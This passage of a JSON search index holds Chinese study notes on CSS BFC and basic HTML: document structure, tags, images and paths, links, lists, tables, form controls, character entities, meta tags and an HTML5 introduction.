）\"]},{\"header\":\"开启了BFC能解决什么问题\",\"slug\":\"开启了bfc能解决什么问题\",\"contents\":[\"元素开启 BFC 后，其子元素不会再产生 margin 塌陷问题\",\"元素开启 BFC 后，自己不会被其他浮动元素所覆盖\",\"元素开启 BFC 后，就算其子元素浮动，元素自身高度也不会塌陷\"]},{\"header\":\"如何开启BFC\",\"slug\":\"如何开启bfc\",\"contents\":[\"根元素\",\"浮动元素绝对定位、固定定位的元素\",\"行内块元素\",\"表格单元格： table 、 thead 、 tbody 、 tfoot 、 th 、 td 、 tr 、 caption\",\"overflow 的值不为 visible 的块元素\",\"伸缩项目\",\"多列容器\",\"column-span 为 all 的元素（即使该元素没有包裹在多列容器中）\",\"display 的值，设置为 flow-root\"]}]},\"/front-end/css-notes/\":{\"title\":\"CSS笔记\",\"contents\":[]},\"/front-end/html-notes/01-HTML%E7%AE%80%E4%BB%8B.html\":{\"title\":\"HTML简介\",\"contents\":[{\"header\":\"什么是 HTML\",\"slug\":\"什么是-html\",\"contents\":[\"HTML 指的是超文本标记语言 (Hyper Text Markup Language) ，它是用来描述网页的一种语言\",\"HTML 不是一种编程语言，而是一种标记语言 (markup language)，标记语言是一套标记标签 (markup tag)\"]},{\"header\":\"Web 标准\",\"slug\":\"web-标准\",\"contents\":[\"Web 标准是由 W3C组织 和其他标准化组织制定的一系列标准的集合。W3C（万维网联盟）是国际最著名的标准化组织\"]},{\"header\":\"为什么需要 Web 标准\",\"slug\":\"为什么需要-web-标准\",\"contents\":[\"浏览器不同，它们显示页面或者排版就有些许差异，遵循 Web 标准除了可以让不同的开发人员写出的页面更标准、更统一外，还有以下优点：\",\"让 Web 的发展前景更广阔\",\"内容能被更广泛的设备访问\",\"更容易被搜索引擎搜索\",\"降低网站流量费用\",\"使网站更易于维护\",\"提高页面浏览速度\"]},{\"header\":\"Web 标准的构成\",\"slug\":\"web-标准的构成\",\"contents\":[\"主要包括：结构（Structure）、表现（Presentation）和行为（Behavior）三个方面\",\"Web 标准提出的最佳体验方案：结构、样式、行为相分离\",\"简单理解：结构写到 HTML 文件中，表现写到 CSS 文件中，行为写到 JavaScript 文件中\",\"结构类似身体\",\"表现类似外观装饰\",\"行为类似行为动作\",\"相比较而言, 三者中结构最重要\"]}]},\"/front-end/html-notes/02-HTML%E6%A0%87%E7%AD%BE.html\":{\"title\":\"HTML标签\",\"contents\":[{\"header\":\"HTML标签\",\"slug\":\"html标签\",\"contents\":[\"标签又称元素，是 HTML 的基本组成单位\",\"HTML 标签是由尖括号包围的关键词，例如 <html>\",\"标签分为单标签和双标签\",\"HTML 标签通常是成对出现的，例如 <html> 和 </html> ，我们称为双标签\",\"标签对中的第一个标签是开始标签，第二个标签是结束标签\",\"有些特殊的标签必须是单个标签（极少情况），例如 <br/>，我们称为单标签\",\"双标签关系可以分为两类：包含关系和并列关系\",\"包含关系：\",\"<head> <title> </title> </head> \",\"并列关系：\",\"<head> </head> <body> </body> \"]},{\"header\":\"HTML标签属性\",\"slug\":\"html标签属性\",\"contents\":[\"用于给标签提供附加信息，可以写在起始标签或单标签中，即 <标签名 属性名=\\\"属性值\\\" 属性名=\\\"属性值\\\">\",\"有些特殊的属性，没有属性名，只有属性值\",\"注意：\",\"不同的标签，有不同的属性；也有一些通用属性（在任何标签内都能写）\",\"属性名、属性值不能乱写，都是 W3C 规定好的\",\"属性名、属性值，都不区分大小写，但推荐小写\",\"双引号，也可以写成单引号，甚至不写都行，但还是推荐写双引号\",\"标签中不要出现同名属性，否则后写的会失效\"]}]},\"/front-end/html-notes/03-HTML%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84.html\":{\"title\":\"HTML基本结构\",\"contents\":[{\"header\":\"基本结构标签\",\"slug\":\"基本结构标签\",\"contents\":[\"每个网页都会有一个基本的结构标签（也称为骨架标签），页面内容也是在这些基本标签上书写\",\"标签名\",\"定义\",\"说明\",\"<html></html>\",\"HTML 标签\",\"页面中最大的标签，我们称为根标签\",\"<head></head>\",\"文档的头部\",\"注意在 head 标签中我们必须要设置的标签是 title\",\"<title></title>\",\"文档的标题\",\"让页面拥有一个属于自己的网页标题\",\"<body></body>\",\"文档的主体\",\"元素包含文档的所有内容，页面内容基本都是放到 body 里面的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>Document</title> </head> <body> </body> </html> \",\"想要呈现在网页中的内容写在 body 标签中\",\"head 标签中的内容不会出现在网页中\",\"head 标签中的 title 标签可以指定网页的标题\"]},{\"header\":\"HTML文档声明\",\"slug\":\"html文档声明\",\"contents\":[\"<!DOCTYPE html> 文档类型声明标签, 告诉浏览器这个页面采取 HTML 5 版本来显示页面\",\"注意：\",\"声明位于文档中的最前面的位置，处于 <html> 标签之前\",\"不是一个 HTML 标签，它就是文档类型声明标签\"]},{\"header\":\"HTML设置语言\",\"slug\":\"html设置语言\",\"contents\":[\"用来定义当前文档显示的语言：\",\"en 定义语言为英语\",\"zh-CN 定义语言为中文\",\"主要作用：让浏览器显示对应的翻译提示；有利于搜索引擎优化\",\"简单来说, 定义为 en 就是英文网页, 定义为 zh-CN 就是中文网页\",\"其实对于文档显示来说，定义成 en 的文档也可以显示中文，定义成 zh-CN 的文档也可以显示英文\"]},{\"header\":\"HTML 字符编码\",\"slug\":\"html-字符编码\",\"contents\":[\"字符集 (Character set)是多个字符的集合。以便计算机能够识别和存储各种文字\",\"在 <head> 标签内，可以通过 <meta> 标签的 charset 属性来规定 HTML 文档应该使用哪种字符编码\",\"<meta charset=\\\"UTF-8\\\" />\",\"charset 常用的值有：GB 2312 、BIG 5 、GBK 和 UTF-8，其中 UTF-8 也被称为万国码，基本包含了全世界所有国家需要用到的字符\",\"注意：上面语法是必须要写的代码，否则可能引起乱码的情况。一般情况下，统一使用“UTF-8”编码，尽量统一写成标准的 \\\"UTF-8\\\"，不要写成  \\\"utf 8\\\" 或 \\\"UTF 8\\\"\"]}]},\"/front-end/html-notes/04-HTML%E6%B3%A8%E9%87%8A.html\":{\"title\":\"HTML注释\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"如果需要在 HTML 文档中添加一些便于阅读和理解但又不需要显示在页面中的注释文字，就需要使用注释标签\",\"HTML 中的注释以 <!-- 开头，以 --> 结束\",\"具体实现：\",\" <!-- 注释语句 --> \",\"VSCode中快捷键: ctrl + / \",\"添加注释是为了更好地解释代码的功能，便于相关开发人员理解和阅读代码，程序是不会执行注释内容的\"]}]},\"/front-end/html-notes/05-HTML%E5%9F%BA%E7%A1%80.html\":{\"title\":\"HTML基础\",\"contents\":[{\"header\":\"排版标签\",\"slug\":\"排版标签\",\"contents\":[\"标签名\",\"标签含义\",\"单/双标签\",\"h1~h6\",\"标题\",\"双\",\"p\",\"段落\",\"双\",\"div、span\",\"没有任何含义，用于整体布局\",\"双\"]},{\"header\":\"标题标签\",\"slug\":\"标题标签\",\"contents\":[\"标题标签 <h1> - <h6>\",\"为了使网页更具有语义化，我们经常会在页面中用到标题标签。HTML 提供了 6 个等级的网页标题，即 <h1> - <h6> ，有重要的意味\",\"特点：\",\"加了标题的文字会变的加粗，字号也会依次变大\",\"一个标题独占一行\",\"具体实现：\",\"<h1>我是一级标题</h1> <h1>标题一共六级选</h1> <h2>文字加粗一行显</h2> <h3>由大到小依次减</h3> <h4>从重到轻随之变</h4> <h5>语法规范书写后</h5> <h6>具体效果刷新见</h6> \"]},{\"header\":\"段落标签\",\"slug\":\"段落标签\",\"contents\":[\"在网页中，要把文字有条理地显示出来，就需要将这些文字分段显示。在 HTML 标签中，<p> 标签用于定义段落，它可以将整个网页分为若干个段落\",\"特点：\",\"文本在一个段落中会根据浏览器窗口的大小自动换行\",\"段落和段落之间保有空隙\",\"具体实现：\",\"<p> 我是一个段落标签 </p> \"]},{\"header\":\"div 和 span 标签\",\"slug\":\"div-和-span-标签\",\"contents\":[\"<div> 和 <span> 是没有语义的，它们就是一个盒子，用来装内容的\",\"具体实现：\",\"<div> 这是头部 </div> <span> 今日价格 </span> \",\"特点：\",\"<div> 标签用来布局，但是现在一行只能放一个 <div>，大盒子\",\"<span> 标签用来布局，一行上可以多个 <span>，小盒子\"]},{\"header\":\"语义化标签\",\"slug\":\"语义化标签\",\"contents\":[\"概念：用特定的标签去表达特定的含义\",\"原则：标签的默认效果不重要（后期可以通过 CSS 随便控制效果），语义最重要！\",\"优势：\",\"代码结构清晰可读性强\",\"有利于 SEO（搜索引擎优化）\",\"方便设备解析（如屏幕阅读器、盲人阅读器等）\"]},{\"header\":\"块级元素与行内元素\",\"slug\":\"块级元素与行内元素\",\"contents\":[\"块级元素：独占一行（排版标签都是块级元素）\",\"行内元素：不独占一行\",\"使用原则：\",\"块级元素中能写行内元素和块级元素（简单记：块级元素中几乎什么都能写）\",\"行内元素中能写行内元素，但不能写块级元素\",\"一些特殊的规则： h1~h6 不能互相嵌套、p 中不要写块级元素\"]},{\"header\":\"文本标签\",\"slug\":\"文本标签\",\"contents\":[\"语义\",\"标签\",\"说明\",\"加粗\",\"<strong></strong>或<b></b>\",\"更推荐使用 <strong> 标签加粗，语义更强烈\",\"倾斜\",\"<em></em>或<i></i>\",\"更推荐使用 <em> 标签倾斜，语义更强烈\",\"删除线\",\"<del></del>或<s></s>\",\"更推荐使用 <del> 标签添加删除线，语义更强烈\",\"下划线\",\"<ins></ins>或<u></u>\",\"更推荐使用 <ins> 标签添加下划线，语义更强烈\"]},{\"header\":\"图片标签\",\"slug\":\"图片标签\",\"contents\":[]},{\"header\":\"图片标签\",\"slug\":\"图片标签-1\",\"contents\":[\"在 HTML 标签中，<img> 标签用于定义 HTML 页面中的图像\",\"具体实现：\",\"<img src=\\\"图像URL\\\" /> \",\"解释：src 是 <img> 标签的必须属性，它用于指定图像文件的路径和文件名,所谓属性简单理解就是属于这个图像标签的特性\",\"图像标签的其他属性：\",\"属性\",\"属性值\",\"说明\",\"src\",\"图片路径\",\"必须属性\",\"alt\",\"文本\",\"替换文本，图像不能显示时显示的文字\",\"title\",\"文本\",\"提示文本，鼠标放到图像上，显示的文字\",\"width\",\"像素\",\"设置图像的宽度\",\"height\",\"像素\",\"设置图像的高度\",\"border\",\"像素\",\"设置图像的边框粗细\",\"图像标签注意点：\",\"图像标签可以拥有多个属性，必须写在标签名的后面\",\"属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开\",\"属性采取键值对的格式，即 key=\\\"value\\\" 的格式，属性 =\\\"属性值\\\"\"]},{\"header\":\"路径\",\"slug\":\"路径\",\"contents\":[\"分为相对路径和绝对路径\"]},{\"header\":\"相对路径\",\"slug\":\"相对路径\",\"contents\":[\"相对路径：以引用文件所在位置为参考基础，而建立出的目录路径\",\"这里简单来说，就是图片相对于 HTML 页面的位置\",\"相对路径分类\",\"符号\",\"说明\",\"同级路径\",\"图像文件位于 HTML 文件同一级，如 <img src=\\\"baidu.gif\\\"/>\",\"下级路径\",\"/\",\"图像文件位于 HTML 文件下一级，如 <img src=\\\"images/baidu.gif\\\"/>\",\"上级路径\",\"../\",\"图像文件位于 HTML 文件上一级，如 <img src=\\\"../baidu.gif\\\"/>\",\"特点：相对路径是从代码所在的这个文件出发，去寻找目标文件的，而我们这里所说的上一级、下一级和同一级就是图片相对于 HTML 页面的位置\"]},{\"header\":\"绝对路径\",\"slug\":\"绝对路径\",\"contents\":[\"绝对路径：是指目录下的绝对位置，直接到达目标位置，通常是从盘符开始的路径，例如，\\\"D:\\\\web\\\\img\\\\logo. gif\\\" 或完整的网络地址 \\\"http://www.itcast.cn/images/logo.gif\\\"\"]},{\"header\":\"常见的图片格式\",\"slug\":\"常见的图片格式\",\"contents\":[\"jpg 格式： \",\"概述：扩展名为 .jpg 或 .jpeg ，是一种有损的压缩格式（把肉眼不容易观察出来的细节丢弃了）\",\"主要特点：支持的颜色丰富、占用空间较小、不支持透明背景、不支持动态图\",\"使用场景：对图片细节没有极高要求的场景，例如：网站的产品宣传图等。—— 该格式网页中很常见\",\"png 格式： \",\"概述：扩展名为 .png ，是一种无损的压缩格式，能够更高质量的保存图片\",\"主要特点：支持的颜色丰富、占用空间略大、支持透明背景、不支持动态图\",\"使用场景：想让图片有透明背景；想更高质量的呈现图片；例如 ：公司 logo 图、重要配图等\",\"bmp 格式： \",\"概述：扩展名为 .bmp ，不进行压缩的一种格式，在最大程度上保留图片更多的细节\",\"主要特点：支持的颜色丰富、保留的细节更多、占用空间极大、不支持透明背景、不支持动态图\",\"使用场景：对图片细节要求极高的场景，例如：一些大型游戏中的图片。（网页中很少使用）\",\"gif 格式： \",\"概述：扩展名为 .gif ，仅支持 256 种颜色，色彩呈现不是很完整\",\"主要特点：支持的颜色较少、支持简单透明背景、支持动态图\",\"使用场景：网页中的动态图片\",\"webp 格式： \",\"概述：扩展名为 .webp ，谷歌推出的一种格式，专门用来在网页中呈现图片\",\"主要特点：具备上述几种格式的优点，但兼容性不太好，一旦使用务必要解决兼容性问题\",\"使用场景：网页中的各种图片\",\"base 64 格式 \",\"本质：一串特殊的文本，要通过浏览器打开，传统看图应用通常无法打开\",\"原理：把图片进行 base 64 编码，形成一串文本\",\"如何生成：靠一些工具或网站\",\"如何使用：直接作为 img 标签的 src 属性的值即可，并且不受文件位置的影响\",\"使用场景：一些较小的图片，或者需要和网页一起加载的图片\"]},{\"header\":\"链接\",\"slug\":\"链接\",\"contents\":[\"链接的语法格式: <a href=\\\"跳转目标\\\" target=\\\"目标窗口的弹出方式\\\"> 文本或图像 </a>\",\"属性：\",\"href：用于指定链接目标的 url 地址\",\"target: 用于指定链接页面的打开方式 _self 默认值 _blank 新窗口打开\",\"#: 空链接\",\"链接分类：\",\"外部链接: 例如 <a href=\\\"http://www.baidu.com\\\">百度</a>\",\"内部链接: 网站内部页面之间的相互链接。直接链接内部页面名称即可，例如 <a href=\\\"index.html\\\">首页</a>\",\"空链接: 如果当时没有确定链接目标时，<a href=\\\"#\\\">首页</a>\",\"下载链接: 如果 href 里面地址是一个文件或者压缩包，会下载这个文件\",\"网页元素链接: 在网页中的各种网页元素，如文本、图像、表格、音频、视频等都可以添加超链接\",\"锚点链接: 点我们点击链接, 可以快速定位到页面中的某个位置，在链接文本的 href 属性中，设置属性值为 #名字 的形式，如 <a href=\\\"#two\\\">第2集</a>，找到目标位置标签，里面添加一个 id属性 = 刚才的名字，如：<h3 id=\\\"two\\\">第2集介绍</h3>\"]},{\"header\":\"列表\",\"slug\":\"列表\",\"contents\":[\"表格是用来显示数据的，那么列表就是用来布局的\",\"列表最大的特点就是整齐、整洁、有序，它作为布局会更加自由和方便\",\"根据使用情景不同，列表可以分为三大类：无序列表、有序列表和自定义列表\"]},{\"header\":\"无序列表\",\"slug\":\"无序列表\",\"contents\":[\"<ul> 标签表示 HTML 页面中项目的无序列表，一般会以项目符号呈现列表项，而列表项使用 <li> 标签定义\",\"无序列表的基本语法格式如下：\",\"<ul> <li>列表项1</li> <li>列表项2</li> <li>列表项3</li> ... </ul> \",\"无序列表的各个列表项之间没有顺序级别之分，是并列的\",\"<ul></ul> 中只能嵌套 <li></li>，直接在 <ul></ul> 标签中输入其他标签或者文字的做法是不被允许的\",\"<li> 与 </li> 之间相当于一个容器，可以容纳所有元素\",\"无序列表会带有自己的样式属性，但在实际使用时，我们会使用 CSS 来设置\"]},{\"header\":\"有序列表\",\"slug\":\"有序列表\",\"contents\":[\"有序列表即为有排列顺序的列表，其各个列表项会按照一定的顺序排列定义。在 HTML 标签中，<ol> 标签用于定义有序列表，列表排序以数字来显示，并且使用 <li> 标签来定义列表项\",\"有序列表的基本语法格式如下：\",\"<ol> <li>列表项1</li> <li>列表项2</li> <li>列表项3</li> ... </ol> \",\"<ol></ol> 中只能嵌套 <li></li>，直接在 <ol></ol> 标签中输入其他标签或者文字的做法是不被允许的\",\"<li> 与 </li> 之间相当于一个容器，可以容纳所有元素\",\"有序列表会带有自己样式属性，但在实际使用时，我们会使用 CSS 来设置\"]},{\"header\":\"自定义列表\",\"slug\":\"自定义列表\",\"contents\":[\"自定义列表的使用场景: 自定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。在 HTML 标签中，<dl> 标签用于定义描述列表（或定义列表），该标签会与 <dt>（定义项目/名字）和 < dd>（描述每一个项目/名字）一起使用\",\"语法如下：\",\"<dl> <dt>名词1</dt> <dd>名词1解释1</dd> <dd>名词1解释2</dd> </dl> \"]},{\"header\":\"表格\",\"slug\":\"表格\",\"contents\":[]},{\"header\":\"基本结构\",\"slug\":\"基本结构\",\"contents\":[\"一个完整的表格由：表格标题、表格头部、表格主体、表格脚注，四部分组成\",\"HTML基础01.png\",\"表格涉及到的标签：\",\"标签\",\"含义\",\"table\",\"表格\",\"caption\",\"表格标题\",\"thead\",\"表格头部\",\"tbody\",\"表格主体\",\"tfoot\",\"表格注脚\",\"tr\",\"每一行\",\"th、td\",\"每一个单元格（备注：表格头部中用 th，表格主体、表格脚注中用 td）\",\"HTML基础02.png\",\"HTML基础03.png\",\"HTML基础04.png\",\"代码演示：\",\" <table border=\\\"1\\\"> <!-- 表格标题 --> <caption> 学生信息 </caption> <!-- 表格头部 --> <thead> <tr> <th>姓名</th> <th>性别</th> <th>年龄</th> <th>民族</th> <th>政治面貌</th> </tr> </thead> <!-- 表格主体--> <tbody> <tr> <td>张三</td> <td>男</td> <td>18</td> <td>汉族</td> <td>团员</td> </tr> <tr> <td>李四</td> <td>女</td> <td>20</td> <td>满族</td> <td>群众</td> </tr> <tr> <td>王五</td> <td>男</td> <td>20</td> <td>回族</td> <td>党员</td> </tr> <tr> <td>赵六</td> <td>女</td> <td>21</td> <td>壮族</td> <td>团员</td> </tr> </tbody> <!-- 表格脚注 --> <tfoot> <tr> <td></td> <td></td> <td></td> <td>共计：4人</td> </tr> </tfoot> </table> \"]},{\"header\":\"常用属性\",\"slug\":\"常用属性\",\"contents\":[\"table 标签（表格）\",\"属性\",\"含义\",\"width\",\"设置表格宽度\",\"height\",\"设置表格最小高度，表格最终高度可能比设置的值大\",\"border\",\"设置表格边框宽度\",\"cellspacing\",\"设置单元格之间的间距\",\"thead 标签（表格头部）\",\"属性\",\"含义\",\"height\",\"设置表格头部高度\",\"align\",\"设置单元格的水平对齐方式，可选 left、center、right\",\"valign\",\"设置单元格的垂直对齐方式，可选 top、middle、bottom\",\"tbody 标签（表格主体）、tr 标签（行）、tfoot 标签（表格脚注）常用属性与 thead 相同\",\"td 标签（普通单元格）\",\"属性\",\"含义\",\"width\",\"设置单元格的宽度，同列所有单元格全都受影响\",\"height\",\"设置单元格的高度，同行所有单元格全都受影响\",\"align\",\"设置单元格的水平对齐方式\",\"valign\",\"设置单元格的垂直对齐方式\",\"rowspan\",\"指定要跨的行数\",\"colspan\",\"指定要跨的列数\",\"注意：\",\"<table> 元素的 border 属性可以控制表格边框，但 border 值的大小，并不控制单元格边框的宽度，只能控制表格最外侧边框的宽度\",\"默认情况下，每列的宽度，得看这一列单元格最长的那个文字\",\"给某个 th 或 td 设置了宽度之后，他们所在的那一列的宽度就确定了\",\"给某个 th 或 td 设置了高度之后，他们所在的那一行的高度就确定了\"]},{\"header\":\"跨行跨列\",\"slug\":\"跨行跨列\",\"contents\":[\"rowspan ：指定要跨的行数 colspan ：指定要跨的列数\"]},{\"header\":\"换行标签\",\"slug\":\"换行标签\",\"contents\":[\"在 HTML 中，一个段落中的文字会从左到右依次排列，直到浏览器窗口的右端，然后才自动换行。如果希望某段文本强制换行显示，就需要使用换行标签 <br/>\",\"具体实现：\",\"<br/> \",\"特点：\",\"<br/> 是个单标签\",\"<br/> 标签只是简单地开始新的一行，跟段落不一样，段落之间会插入一些垂直的间距\"]},{\"header\":\"分隔线\",\"slug\":\"分隔线\",\"contents\":[\"<hr> 分隔线，单标签\",\"<hr> 的语义是分隔，如果不想要语义，只是想画一条水平线，那么应当使用 CSS 完成\"]},{\"header\":\"表单\",\"slug\":\"表单\",\"contents\":[\"概念：一个包含交互的区域，用于收集用户提供的数据\"]},{\"header\":\"基本结构\",\"slug\":\"基本结构-1\",\"contents\":[\"<form action=\\\"https://www.baidu.com/s\\\" target=\\\"_blank\\\" method=\\\"get\\\"> <input type=\\\"text\\\" name=\\\"wd\\\" /> <button>去百度搜索</button> </form> \",\"form 标签（表单），双标签\",\"属性\",\"含义\",\"action\",\"用于指定表单的提交地址\",\"target\",\"用于控制表单提交后，如何打开页面，常用值如下：_self 在本窗口打开，_blank 在新窗口打开\",\"method\",\"用于控制表单的提交方式\",\"input 标签（输入框），单标签\",\"属性\",\"含义\",\"type\",\"设置输入框的类型，目前用到的值是 text ，表示普通文本\",\"name\",\"用于指定提交数据的名字\"]},{\"header\":\"常用表单控件\",\"slug\":\"常用表单控件\",\"contents\":[]},{\"header\":\"文本输入框\",\"slug\":\"文本输入框\",\"contents\":[\"<input type=\\\"text\\\"> \",\"常用属性如下：\",\"name 属性：数据的名称\",\"value 属性：输入框的默认输入值\",\"maxlength 属性：输入框最大可输入长度\"]},{\"header\":\"密码输入框\",\"slug\":\"密码输入框\",\"contents\":[\"<input type=\\\"password\\\"> \",\"常用属性如下：\",\"name 属性：数据的名称\",\"value 属性：输入框的默认输入值（一般不用，无意义）\",\"maxlength 属性：输入框最大可输入长度\"]},{\"header\":\"单选框\",\"slug\":\"单选框\",\"contents\":[\"<input type=\\\"radio\\\" name=\\\"sex\\\" value=\\\"female\\\">女 <input type=\\\"radio\\\" name=\\\"sex\\\" value=\\\"male\\\">男 \",\"常用属性如下：\",\"name 属性：数据的名称，注意：想要单选效果，多个 radio 的 name 属性值要保持一致\",\"value 属性：提交的数据值\",\"checked 属性：让该单选按钮默认选中\"]},{\"header\":\"复选框\",\"slug\":\"复选框\",\"contents\":[\"<input type=\\\"checkbox\\\" name=\\\"hobby\\\" value=\\\"sing\\\">唱 <input type=\\\"checkbox\\\" name=\\\"hobby\\\" value=\\\"dance\\\">跳 <input type=\\\"checkbox\\\" name=\\\"hobby\\\" value=\\\"rap\\\">rap \",\"常用属性如下：\",\"name 属性：数据的名称\",\"value 属性：提交的数据值\",\"checked 属性：让该复选框默认选中\"]},{\"header\":\"隐藏域\",\"slug\":\"隐藏域\",\"contents\":[\"<input type=\\\"hidden\\\" name=\\\"tag\\\" value=\\\"100\\\"> \",\"用户不可见的一个输入区域，作用是： 提交表单的时候，携带一些固定的数据\",\"常用属性如下：\",\"name 属性：指定数据的名称\",\"value 属性：指定的是真正提交的数据\"]},{\"header\":\"提交按钮\",\"slug\":\"提交按钮\",\"contents\":[\"<input type=\\\"submit\\\" value=\\\"点我提交表单\\\"> <button>点我提交表单</button> \",\"注意：\",\"button 标签 type 属性的默认值是 submit\",\"button 不要指定 name 属性\",\"input 标签编写的按钮，使用 value 属性指定按钮文字\"]},{\"header\":\"重置按钮\",\"slug\":\"重置按钮\",\"contents\":[\"<input type=\\\"reset\\\" value=\\\"点我重置\\\"> <button type=\\\"reset\\\">点我重置</button> \",\"注意：\",\"button 不要指定 name 属性\",\"input 标签编写的按钮，使用 value 属性指定按钮文字\"]},{\"header\":\"普通按钮\",\"slug\":\"普通按钮\",\"contents\":[\"<input type=\\\"button\\\" value=\\\"普通按钮\\\"> <button type=\\\"button\\\">普通按钮</button> \",\"注意：普通按钮的 type 值为 button ，若不写 type 值是 submit 会引起表单的提交\"]},{\"header\":\"文本域\",\"slug\":\"文本域\",\"contents\":[\"<textarea name=\\\"msg\\\" rows=\\\"22\\\" cols=\\\"3\\\">我是文本域</textarea> \",\"常用属性如下：\",\"rows 属性：指定默认显示的行数，会影响文本域的高度\",\"cols 属性：指定默认显示的列数，会影响文本域的宽度\",\"不能编写 type 属性，其他属性，与普通文本输入框一致\"]},{\"header\":\"下拉框\",\"slug\":\"下拉框\",\"contents\":[\"<select name=\\\"from\\\"> <option value=\\\"黑\\\">黑龙江</option> <option value=\\\"吉\\\">吉林</option> <option value=\\\"辽\\\">辽宁</option> </select> \",\"常用属性及注意事项：\",\"name 属性：指定数据的名称\",\"option 标签设置 value 属性，如果没有 value 属性，提交的数据是 option 中间的文字；如果设置了 value 属性，提交的数据就是 value 的值（建议设置 value 属性）\",\"option 标签设置了 selected 属性，表示默认选中\"]},{\"header\":\"禁用表单控件\",\"slug\":\"禁用表单控件\",\"contents\":[\"给表单控件的标签设置 disabled 既可禁用表单控件\",\"input 、 textarea 、 button 、 select 、 option 都可以设置 disabled 属性\"]},{\"header\":\"label 标签\",\"slug\":\"label-标签\",\"contents\":[\"label 标签可与表单控件相关联，关联之后点击文字，与之对应的表单控件就会获取焦点\",\"两种与 label 关联方式如下：\",\"让 label 标签的 for 属性的值等于表单控件的 id\",\"把表单控件套在 label 标签的里面\"]},{\"header\":\"fieldset 与 legend 的使用\",\"slug\":\"fieldset-与-legend-的使用\",\"contents\":[\"fieldset 可以为表单控件分组、 legend 标签是分组的标题\",\"例：\",\"<fieldset> <legend>主要信息</legend> <label for=\\\"zhanghu\\\">账户:</label> <input id=\\\"zhanghu\\\" type=\\\"text\\\" name=\\\"account\\\" maxlength=\\\"10\\\"><br> <label> 密码: <input id=\\\"mima\\\" type=\\\"password\\\" name=\\\"pwd\\\" maxlength=\\\"6\\\"> </label> <br> 性别: <input type=\\\"radio\\\" name=\\\"gender\\\" value=\\\"male\\\" id=\\\"nan\\\"> <label for=\\\"nan\\\">男</label> <label> <input type=\\\"radio\\\" name=\\\"gender\\\" value=\\\"female\\\" id=\\\"nv\\\">女 </label> </fieldset> \"]},{\"header\":\"框架标签\",\"slug\":\"框架标签\",\"contents\":[\"标签名\",\"功能和语义\",\"属性\",\"单/双标签\",\"iframe\",\"框架（在网页中嵌入其他文件）\",\"name: 框架名字，可以与 target 属性配合；width：框架的宽度；height：框架的高度；frameborder：是否显示边框，值为 0 或 1\",\"双\",\"iframe 标签的实际应用：\",\"在网页中嵌入广告\",\"与超链接或表单的 target 配合，展示不同的内容\"]},{\"header\":\"HTML 实体\",\"slug\":\"html-实体\",\"contents\":[\"在 HTML 中我们可以用一种 特殊的形式 的内容，来表示某个符号，这种特殊形式的内容，就是 HTML 实体。比如小于号 < 用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体\",\"字符实体由三部分组成：一个 & 和一个实体名称（或者一个 # 和一个实体编号），最后加上一个分号 ;\",\"常见的字符实体：\",\"描述\",\"实体名称\",\"实体编号\",\"空格\",\"&nbsp;\",\"&#160;\",\"<\",\"小于号\",\"&lt;\",\"&#60;\",\">\",\"大于号\",\"&gt;\",\"&#62;\",\"&\",\"和号\",\"&amp;\",\"&#38;\",\"\\\"\",\"引号\",\"&quot;\",\"&#34;\",\"￥\",\"元（yen）\",\"&yen;\",\"&#165;\",\"©\",\"版权（copyright）\",\"&copy;\",\"&#169;\",\"×\",\"乘号\",\"&times;\",\"&#215;\",\"÷\",\"除号\",\"&divide;\",\"&#247;\"]},{\"header\":\"HTML 全局属性\",\"slug\":\"html-全局属性\",\"contents\":[\"常用的全局属性：\",\"属性名\",\"含义\",\"id\",\"给标签指定唯一标识，注意：id 是不能重复的。作用：可以让 label 标签与表单控件相关联；也可以与 CSS、JavaScript 配合使用\",\"class\",\"给标签指定类名，随后通过 CSS 就可以给标签设置样式\",\"style\",\"给标签设置 CSS 样式\",\"dir\",\"内容的方向，值: ltr、rtl\",\"title\",\"给标签设置一个文字提示，一般超链接和图片用得比较多\",\"lang\",\"给标签指定语\"]},{\"header\":\"meta 元信息\",\"slug\":\"meta-元信息\",\"contents\":[\"配置字符编码\",\"<meta charset=\\\"UTF-8\\\"> \",\"针对 IE 浏览器的兼容性配置\",\"<meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> \",\"针对移动端的配置\",\"<meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> \",\"配置网页关键字\",\"<meta name=\\\"keywords\\\" content=\\\"8-12个以英文逗号隔开的单词/词语\\\"> \",\"配置网页描述信息\",\"<meta name=\\\"description\\\" content=\\\"80字以内的一段话，与网站内容相关\\\"> \",\"针对搜索引擎爬虫配置\",\"<meta name=\\\"robots\\\" content=\\\"此处可选值见下表\\\"> \",\"值\",\"描述\",\"index\",\"允许搜索爬虫索引此页面\",\"noindex\",\"要求搜索爬虫不索引此页面\",\"follow\",\"允许搜索爬虫跟随此页面上的链接\",\"nofollow\",\"要求搜索爬虫不跟随此页面上的链接\",\"all\",\"与 index，follow 等价\",\"none\",\"与 noindex，nofollow 等价\",\"noarchive\",\"要求搜索引擎不缓存页面内容\",\"nocache\",\"noarchive 的替代名称\",\"配置网页作者\",\"<meta name=\\\"author\\\" content=\\\"tony\\\"> \",\"配置网页生成工具\",\"<meta name=\\\"generator\\\" content=\\\"Visual Studio Code\\\"> \",\"配置定义网页版权信息\",\"<meta name=\\\"copyright\\\" content=\\\"2023-2027©版权所有\\\"> \",\"配置网页自动刷新\",\"<meta http-equiv=\\\"refresh\\\" content=\\\"10;url=http://www.baidu.com\\\"> \"]}]},\"/front-end/html-notes/06-HTML5%E7%AE%80%E4%BB%8B.html\":{\"title\":\"HTML5简介\",\"contents\":[{\"header\":\"什么是 HTML5\",\"slug\":\"什么是-html5\",\"contents\":[\"HTML5 是新一代的 HTML 标准，2014年10月由万维网联盟（ W3C ）完成标准制定\",\"HTML5 在狭义上是指新一代的 HTML 标准，在广义上是指：整个前端\"]},{\"header\":\"HTML 5 优势\",\"slug\":\"html-5-优势\",\"contents\":[\"针对 JavaScript ，新增了很多可操作的接口\",\"新增了一些语义化标签、全局属性\",\"新增了多媒体标签，可以很好的替代 flash\",\"更加侧重语义化，对于 SEO 